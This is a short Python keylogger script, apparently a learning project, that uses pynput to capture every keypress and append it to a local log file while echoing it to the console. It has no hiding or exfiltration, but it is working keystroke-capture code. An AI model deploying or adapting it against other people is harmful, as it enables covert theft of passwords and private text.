from pynput.keyboard import Listener
import os

log_file_path = "nidhi ji/log.txt"
# write your file path ("location")

print("Absolute path of log file:", os.path.abspath(log_file_path))

# function to log key
def log_key(key):
    letter = str(key)
    letter = letter.replace("'", "")
    
    #simplyfy the logged key names
    special_keys ={

    'Key.space': ' ',
    'Key.shift_r': '',
    'Key.ctrl_l' : '',
    'Key.enter':"\n",
    'Key.backspace': '<BACKSPACE>',
    'Key.tab': '\t',
    'Key.esc': '<ESC>',
    'Key.up': '<UP>',
    'Key.down': '<DOWN>',
    'Key.left': '<LEFT>',
    'Key.right': '<RIGHT>',
    }
    letter = special_keys.get(letter,letter)
    
    try:
        with open(log_file_path , "a") as f:
            f.write(letter)
            f.flush()
            print("Logged Key:", letter)
    except Exception as e:
        print("Error writing to file:",e)

# Collecting events until stopped
def start_logging():
    print("keylogger is running...(press ctrl + c to stop)")
    print("Saving logs to:", os.path.abspath(log_file_path))
    with Listener(on_press=log_key) as listener:
        listener.join()
if __name__=="__main__":
    start_logging()
